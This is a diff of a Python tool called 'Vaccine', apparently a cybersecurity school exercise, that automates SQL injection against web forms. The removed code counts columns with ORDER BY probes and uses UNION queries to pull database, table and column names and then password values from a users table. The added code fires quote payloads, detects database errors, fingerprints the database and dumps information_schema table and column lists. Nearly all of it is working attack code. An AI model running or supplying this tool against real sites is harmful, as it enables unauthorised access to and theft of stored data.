@@ -1,388 +1,310 @@
-#!/usr/bin/python3
+#!/usr/bin/env python3
+
 import argparse
 import requests
-import re
-import os
-import difflib
+import logging
+from pprint import pprint
+from payloads import payloadsList
+from urllib.parse import urljoin
+from bs4 import BeautifulSoup as bs
+from colorama import init, Fore, Style
+import json
+import sys
 
-REQUEST_TYPES = set(["get", "post"])
+# Initialize colorama
+init()
 
-token = os.environ.get('TOKEN')
-cookies = {'PHPSESSID': token, "security": "low"}
+# Global variables
+database = 'Not found'
+database_found = 'False'
 
-class Style():
-	RED = "\x1b[31m"
-	GREEN = "\x1b[32m"
-	CYAN = "\x1b[96m"
-	RESET = "\033[0m"
+# Set up logging
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
-def error_exit(msg):
-	print(f"Error: {msg}")
-	exit(1)
+# Keep session open and set headers
+s = requests.Session()
+s.headers["User-Agent"] = "Mozilla/5.0 (Win64; x64) AppleWebKit/537.36 Chrome/87.0.4280.88"
 
-def error_continue(msg):
-	print(f"Error: {msg}")
+def get_forms(url):
+    """
+    Fetch all forms from the given URL.
+    """
+    q = bs(s.get(url).content, "html.parser")
+    return q.find_all("form")
 
-def form_url(url, add):
-	if add == "#":
-		return url
-	if add.startswith('/'):
-		if url.endswith('/'):
-			url = url[:-1]
-		return url + add
+def get_form_details(form):
+    """
+    Extract and return form details including action, method, and inputs.
+    """
+    detailsOfForm = {}
+    action = form.attrs.get("action", "").lower()
+    method = form.attrs.get("method", "get").lower()
+    inputs = []
+    for input_tag in form.find_all("input"):
+        input_type = input_tag.attrs.get("type", "text")
+        input_name = input_tag.attrs.get("name")
+        input_value = input_tag.attrs.get("value", "")
+        inputs.append({"type": input_type, "name": input_name, "value": input_value})
+    detailsOfForm["action"] = action
+    detailsOfForm["method"] = method
+    detailsOfForm["inputs"] = inputs
+    return detailsOfForm
 
-	baseurl_match = re.search(r'^(https?://[^/]+)', url)
-	if not baseurl_match:
-		error_exit(f"worng url - {url}")
-	baseurl = baseurl_match.group()
-	return baseurl + '/' + add
+def vulnerable(response, result):
+    """
+    Check if the response contains SQL injection errors.
+    """
+    errors = {
+        "you have an error in your sql syntax;",
+        "warning: mysql",
+        ": syntax error",
+        "unrecognized token"
+    }
+    for error in errors:
+        if error in response.content.decode().lower():
+            if database_found == 'False':
+                resultCheckDb = ft_check_db(response)
+                result.update(resultCheckDb)
+            return True
+    return False
 
-def get_diff(str1, str2):
-	diff = difflib.unified_diff(str1.splitlines(), str2.splitlines(), n = 0)
-	ret = ""
-	cnt = 0
-	for d in diff:
-		cnt = cnt + 1
-		if cnt < 4:
-			continue
-		if d.startswith("-"):
-			continue
-		ret = ret + d[1:].strip() + '\n'
-	return ret
+def ft_check_db(response):
+    """
+    Identify the database type based on error messages in the response.
+    """
+    result = {}
+    global database, database_found
+    if database_found == 'False':
+        if "mariadb" in response.content.decode().lower():
+            database = "MariaDB"
+        elif "mysql" in response.content.decode().lower():
+            database = "MySQL"
+        elif "sqlite" in response.content.decode().lower():
+            database = "SQLite"
+        elif "microsoft sql server" in response.content.decode().lower():
+            database = "SQL Server"
+        if database != 'Not found':
+            database_found = "True"
+        if database_found == 'True':
+            result["databases"] = database
+    return result
 
-def get_result(str1, str2, query=""):
-	diff = get_diff(str1, str2)
-	result = diff.replace("<b>", "")
-	result = result.replace("</b>", "")
-	result = re.sub('<(.|\n)*?>', '\n', result)
-	result = re.sub('\n+', '\n', result)
-	if query:
-		result = result.replace(query, "[query]")
-	return result
 
-class Log:
-	def __init__(self, filename):
-		self.data = ""
-		self.filename = filename
+def extract_table_names(response):
+    """
+    Extract table names using SQL injection.
+    """
+    tables = []
+    if "table_name" in response.content.decode().lower():
+        soup = bs(response.content, "html.parser")
+        tables = [tag.text for tag in soup.find_all("table_name")]
+    return tables
 
-	def log(self, msg, color=""):
-		if color:
-			print(color + msg[:500] + Style.RESET)
-		else:
-			print(msg[:500])
-		self.data = self.data + msg + '\n'
+def extract_column_names(response):
+    """
+    Extract column names using SQL injection.
+    """
+    columns = []
+    if "column_name" in response.content.decode().lower():
+        soup = bs(response.content, "html.parser")
+        columns = [tag.text for tag in soup.find_all("column_name")]
+    return columns
 
-	def to_file(self):
-		with open(self.filename, "w") as f:
-			f.write(self.data)
+def save_results(results, output_file):
+    """
+    Save the results to a specified output file in a readable format.
+    """
+    formatted_results = {
+        "URL": results["url"],
+        "Vulnerable": results["vulnerable"],
+        "Payloads": []
+    }
 
-class VaccineHelper:
-	def __init__(self, submit, comment):
-		self.submit = submit
-		self.delimiter = "'"
-		self.comment = comment
-		self.original_text = self.submit("").text
-		self.normal_text = self.submit("' or 1=1" + self.comment).text
+    for payload in results["payloads"]:
+        formatted_payload = {
+            "payload": payload["payload"],
+            "response": format_response(payload["response"]),
+            "vulnerable_parameters": payload.get("vulnerable_parameters", []),
+            "database_info": payload.get("database_info", {}),
+            "table_info": payload.get("table_info", {}),
+            "column_info": payload.get("column_info", {}),
+            "complete_dump": payload.get("complete_dump", "")
+        }
+        formatted_results["Payloads"].append(formatted_payload)
 
-class Error:
-	class ErrorException(Exception):
-		pass
+    if results.get("database_name") or results.get("database_version") or results.get("databases"):
+        formatted_results["Database Information"] = {
+            "Name": results.get("database_name"),
+            "Version": results.get("database_version"),
+            "Detected Databases": results.get("databases", [])
+        }
 
-	def __init__(self, helper):
-		logger.log(f"< ERROR comment:{helper.comment} >", Style.GREEN)
-		self.submit = helper.submit
-		self.delimiter = helper.delimiter
-		self.comment = helper.comment
-		self.original_text = helper.original_text
-		self.normal_text = helper.normal_text
+    with open(output_file, 'w') as f:
+        json.dump(formatted_results, f, indent=4, ensure_ascii=False)
+    print(Fore.GREEN + f"Results saved to {output_file}" + Style.RESET_ALL)
 
-	def error(self):
-		flag = 0
-		for i in range(1, 12):
-			q = f" ORDER BY {i}"
-			query = self.delimiter + q + self.comment
-			res = self.submit(query)
-			logger.log(f"QUERY: {query}", Style.CYAN)
-			result = get_diff(self.original_text, res.text)
-			if res.text and not result:
-				flag = 1
-				continue
-			result = get_diff(self.normal_text, res.text)
-			if len(self.normal_text) == len(res.text):
-				flag = 1
-				continue
-			if not result:
-				continue
-			break
-		column_counts = i - flag
-		if column_counts == 0 or column_counts >= 10:
-			raise self.ErrorException("this method does not work")
-		logger.log(f"column counts: {column_counts}")
-		return column_counts
+def format_response(response_text):
+    """
+    Extract and format the response details.
+    """
+    lines = response_text.split('\n')
+    error_line = next((line for line in lines if 'Fatal error' in line), None)
+    file_line = next((line for line in lines if ' in ' in line), None)
+    stack_trace = [line for line in lines if line.startswith('#')]
 
-class Union:
-	class UnionException(Exception):
-		pass
+    if not error_line or not file_line:
+        return {
+            "raw_response": response_text
+        }
 
-	def __init__(self, helper, get_input, column_counts):
-		logger.log(f"< UNION comment:{helper.comment} >", Style.CYAN)
-		self.submit = helper.submit
-		self.delimiter = helper.delimiter
-		self.header = self.delimiter + " UNION "
-		self.comment = helper.comment
-		self.get_input = get_input
+    error_type = error_line.split(': ')[1].split(':')[0].strip()
+    error_message = ': '.join(error_line.split(': ')[2:]).strip()
+    file_info = file_line.split(' in ')[1]
 
-		self.original_text = helper.original_text
-		self.normal_text = helper.normal_text
-		self.column_counts = column_counts
+    if ' on line ' in file_info:
+        file_path, line_info = file_info.split(' on line ')
+        line_number = int(line_info.strip())
+    else:
+        file_path = file_info.strip()
+        line_number = None
 
-		self.mysql = True
+    formatted_response = {
+        "error_type": error_type,
+        "error_message": error_message,
+        "file": file_path
+    }
+    
+    if line_number is not None:
+        formatted_response["line"] = line_number
+    
+    formatted_response["stack_trace"] = stack_trace
 
-		self.db_name = None
-		self.table_name = None
+    return formatted_response
 
-	def submit_query(self, column_name, contents=""):
-		column_lst = ["null"] * (self.column_counts - 1)
-		column_lst.append(column_name)
-		colums = ", ".join(column_lst)
-		query = self.header + "SELECT " + colums + contents + self.comment
-		return self.submit(query).text, query
+def submit_form(form_details, url, payload, method):
+    """
+    Submit the form with the given payload.
+    """
+    target_url = urljoin(url, form_details["action"])
+    data = {}
+    for input_tag in form_details["inputs"]:
+        if input_tag["type"] == "text" or input_tag["type"] == "search":
+            data[input_tag["name"]] = payload
+        else:
+            data[input_tag["name"]] = "test"
+    if method == "POST":
+        return requests.post(target_url, data=data)
+    else:
+        return requests.get(target_url, params=data)
 
-	def exec_union(self, column_name, contents):
-		response, query = self.submit_query(column_name, contents)
-		logger.log(f"QUERY: {query}", Style.CYAN)
-		result = get_result(self.original_text, response, query)
-		if not result:
-			raise self.UnionException("this method does not work")
-		logger.log(result)
+def ft_injection_sql(url, method, form):
+    """
+    Perform SQL injection on the given form.
+    """
+    result = {"payloads": []}
+    for p_type in payloadsList:
+        for i in payloadsList[p_type]:
+            form_details = get_form_details(form)
+            response = submit_form(form_details, url, i, method)
+            vulnerabilities = vulnerable(response, result)
+            if vulnerabilities:
+                vulnerable_payload = {
+                    "payload": i,
+                    "response": response.text,
+                    "vulnerable_parameters": [input_tag["name"] for input_tag in form_details["inputs"]],
+                    "database_info": {},
+                    "table_info": {},
+                    "column_info": {},
+                    "complete_dump": ""
+                }
 
-	def check_union(self, column_name, compare):
-		response, query = self.submit_query(column_name)
-		result = get_result(compare, response)
-		#logger.log(result)
-		return result
+                if database_found == 'True':
+                    vulnerable_payload["database_info"] = {
+                        "name": database
+                    }
 
-	def get_version(self):
-		response, query = self.submit_query("error")
-		result = self.check_union("@@version", response)
-		if result:
-			logger.log(f"mode: MYSQL", Style.GREEN)
-			return
-		result = self.check_union("sqlite_version()", response)
-		if result:
-			logger.log(f"mode: SQLite", Style.GREEN)
-			self.mysql = False
+                    # Extract table names using SQL injection
+                    table_response = submit_form(form_details, url, " UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()-- ", method)
+                    table_names = extract_table_names(table_response)
+                    vulnerable_payload["table_info"] = {"table_names": table_names}
 
-	def read_input(self, name):
-		if not self.get_input:
-			return
-		data = input(f"Enter {name}: ")
-		return data
+                    # Extract column names using SQL injection for each table
+                    for table in table_names:
+                        column_response = submit_form(form_details, url, f" UNION SELECT column_name FROM information_schema.columns WHERE table_name='{table}'-- ", method)
+                        column_names = extract_column_names(column_response)
+                        vulnerable_payload["column_info"][table] = column_names
 
-	def get_database_name(self):
-		if self.mysql:
-			self.exec_union("DATABASE()", "")
-		else:
-			self.exec_union("sql", " FROM sqlite_schema")
+                    # Optionally, perform a complete database dump if feasible
+                    # This might require complex queries depending on the database structure
+                    # vulnerable_payload["complete_dump"] = perform_complete_database_dump()
 
-	def get_table_names(self):
-		if self.mysql:
-			self.db_name = self.read_input("database name")
-			column_name = "table_name"
-			contents = " FROM information_schema.tables WHERE table_type='BASE TABLE'"
-			if self.db_name:
-				contents = contents + f" AND table_schema = '{self.db_name}'"
-		else:
-			column_name = "tbl_name"
-			contents = " FROM sqlite_master"
-		self.exec_union(column_name, contents)
+                result["payloads"].append(vulnerable_payload)
+    return result
 
-	def get_column_names(self):
-		if self.mysql:
-			self.table_name = self.read_input("table name")
-			column_name = "column_name"
-			contents = " FROM information_schema.columns"
-			if self.table_name:
-				contents = contents + f" WHERE table_name = '{self.table_name}'"
-		else:
-			self.table_name = self.read_input("table name")
-			column_name = "sql"
-			contents = " FROM sqlite_master"
-			if self.table_name:
-				contents = contents + f" WHERE name = '{self.table_name}'"
-		self.exec_union(column_name, contents)
+def detect_sql_injection(url, payloads, method):
+    """
+    Detect SQL injection vulnerabilities in the given URL.
+    """
+    forms = get_forms(url)
+    results = {
+        "url": url,
+        "vulnerable": False,
+        "payloads": [],
+        "database_name": None,
+        "database_version": None,
+        "databases": []
+    }
 
-	def get_all_data(self):
-		if self.mysql:
-			column_name = self.read_input("column name")
-			if not column_name:
-				column_name = "password"
-			contents = f" FROM {self.table_name}"
-			if not self.table_name:
-				contents = f" FROM users"
-		else:
-			column_name = self.read_input("column name")
-			if not column_name:
-				column_name = "password"
-			contents = f" FROM {self.table_name}"
-			if not self.table_name:
-				contents = f" FROM users"
-		self.exec_union(column_name, contents)
+    for form in forms:
+        form_details = get_form_details(form)
+        for payload in payloads:
+            method = method.upper()
+            response = submit_form(form_details, url, payload, method)
+            if vulnerable(response, results):
+                results["vulnerable"] = True
+                results["payloads"].append({
+                    "payload": payload,
+                    "response": response.text
+                })
+                resultsqlinjection = ft_injection_sql(url, method, form)
+                if "payloads" in results and "payloads" in resultsqlinjection:
+                    results["payloads"].extend(resultsqlinjection["payloads"])
+                print(Fore.RED + f"Vulnerable to payload: {payload}" + Style.RESET_ALL)
+            else:
+                print(Fore.GREEN + f"Not vulnerable to payload: {payload}" + Style.RESET_ALL)
 
-	def union(self):
-		try:
-			self.get_version()
-			self.get_database_name()
-			self.get_table_names()
-			self.get_column_names()
-			self.get_all_data()
-		except self.UnionException as e:
-			error_continue(e)
-		except Exception as e:
-			error_exit(e)
+        if results["vulnerable"]:
+            break
 
-class Vaccine:
-	def __init__(self, url, method, get_input):
-		self.url = url
-		self.method = method
-		self.get_input = get_input
+    return results
 
-		txt = self.request()
-		form = self.get_form(txt)
-		self.request_url = self.get_request_url(form)
-		field = self.get_field_names(form)
-		if len(field) > 2:
-			self.username_field_name = field[0]
-			self.password_field_name = field[1]
-		else:
-			self.username_field_name = field[0]
-			self.password_field_name = None
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(
+        prog='Vaccine',
+        description='Vaccine which allows you to perform an SQL injection by providing a URL as parameter.',
+        epilog='42 Cybersecurity')
 
-	def __str__(self):
-		return f'''[metadata]
-- url: {self.url}
-- request-url: {self.request_url}
-- method: {self.method}
-- username-field: {self.username_field_name}
-- password-field: {self.password_field_name}'''
+    parser.add_argument('URL', type=str, help='The URL of the website to perform SQL injection')
+    parser.add_argument('-o', type=str, default="archive.json", help='Archive file, if not specified it will be stored in a default one.')
+    parser.add_argument('-X', type=str, default="GET", help='Type of request, if not specified GET will be used.')
 
-	def get_form(self, txt):
-		forms = re.findall(r'(<form(.|\s)*?</form>)', txt)
+    args = parser.parse_args()
+    print(args)
+    if args.X not in ['POST', 'GET']:
+        print(Fore.RED + "Error: method not accepted" + Style.RESET_ALL)
+        sys.exit(1)
+        
+    payloads = ["'", "\"", "`", "\\", "/*'*/", ")'"]
+    results = detect_sql_injection(args.URL, payloads, args.X)
+    save_results(results, args.o)
 
-		if not forms:
-			error_exit("form block does not exist")
-		filtered_froms = []
-		for form in forms:
-			method_match = re.search(r'method="(.*?)"', form[0])
-			if not method_match:
-				continue
-			if method_match.group(1).lower() != self.method:
-				continue
-			filtered_froms.append(form[0])
-		#logger.log(forms)
-		if not filtered_froms:
-			error_exit("method does not match")
-		if len(filtered_froms) > 1:
-			error_exit("multiple fields exist, cannot determin")
-		return filtered_froms[0]
-
-	def get_field_names(self, form):
-		return re.findall(r'<input[^>]+name="(.*?)"', form)
-
-	def get_request_url(self, form):
-		actions = re.findall(r'<form[^>]+action="(.*?)"', form)
-		if not actions:
-			return self.url
-		if len(actions) > 1:
-			error_exit("too many actions found")
-		return form_url(self.url, actions[0])
-
-	def request(self):
-		try:
-			response = requests.get(self.url, cookies=cookies)
-		except requests.exceptions.ConnectionError:
-			error_exit(f"connection refused - {self.url}")
-		except Exception as e:
-			error_exit(e)
-		if response.status_code == 302:
-			error_exit("no cookie found")
-			return request()
-
-		if response.status_code != 200:
-			error_exit(f"{self.url} - {response}")
-		return response.text
-
-	def submit(self, username, password="password"):
-		if self.password_field_name:
-			payload = {
-				self.username_field_name: username,
-				self.password_field_name: password
-			}
-		else:
-			payload = {
-				self.username_field_name: username,
-				"Submit" : "Submit"
-			}
-		#logger.log(f"payload {payload}")
-		res = requests.get(self.request_url, params=payload, cookies=cookies)
-		if self.method == "get":
-			res = requests.get(self.request_url, params=payload, cookies=cookies)
-		elif self.method == "post":
-			res = requests.post(self.request_url, data=payload, cookies=cookies)
-		return res
-
-	def vaccine(self):
-		try:
-			v = VaccineHelper(self.submit, "#")
-			e = Error(v)
-			column_counts = e.error()
-			u = Union(v, self.get_input, column_counts)
-			u.union()
-		except Error.ErrorException or Union.UnionException as e:
-			error_continue(e)
-		#except Exception as e:
-		#	error_exit(e)
-		try:
-			v = VaccineHelper(self.submit, "--")
-			e = Error(v)
-			column_counts = e.error()
-			u2 = Union(v, self.get_input, column_counts)
-			u2.union()
-		except Error.ErrorException or Union.UnionException as e:
-			error_continue(e)
-		#except Exception as e:
-		#	error_exit(e)
-
-def validate_args(args):
-	if not args.url.startswith('https://') and \
-		not args.url.startswith('http://'):
-		args.url = 'http://' + args.url
-	args.x = args.x.lower()
-	if args.x not in REQUEST_TYPES:
-		error_exit(f"Request type {args.x} is not supported")
-
-def parse_args():
-	parser = argparse.ArgumentParser()
-	parser.add_argument("url", metavar="URL", type=str)
-	parser.add_argument("-o", type=str, default="log.txt",
-		help="Archive file, if not specified it will be stored in a default one.")
-	parser.add_argument("-x", type=str, default="GET",
-		help="Type of request, if not specified GET will be used.")
-	parser.add_argument("-i", action="store_true",
-		help="Specify talbe and column name using input")
-	args = parser.parse_args()
-
-	return args
-
-def main():
-	args = parse_args()
-	validate_args(args)
-	global logger
-	logger = Log(args.o)
-	vaccine = Vaccine(args.url, args.x, args.i)
-	vaccine.vaccine()
-	print(vaccine)
-	logger.to_file()
-
-if __name__ == '__main__':
-	main()
+    if results["vulnerable"]:
+        print(Fore.RED + "The site is vulnerable to SQL injection." + Style.RESET_ALL)
+        if results["database_name"]:
+            print(Fore.YELLOW + f"Database name: {results['database_name']}" + Style.RESET_ALL)
+        if results["database_version"]:
+            print(Fore.YELLOW + f"Database version: {results['database_version']}" + Style.RESET_ALL)
+        if results["databases"]:
+            print(Fore.YELLOW + f"Databases: {', '.join(results['databases'])}" + Style.RESET_ALL)
+    else:
+        print(Fore.GREEN + "The site is not vulnerable to SQL injection." + Style.RESET_ALL)
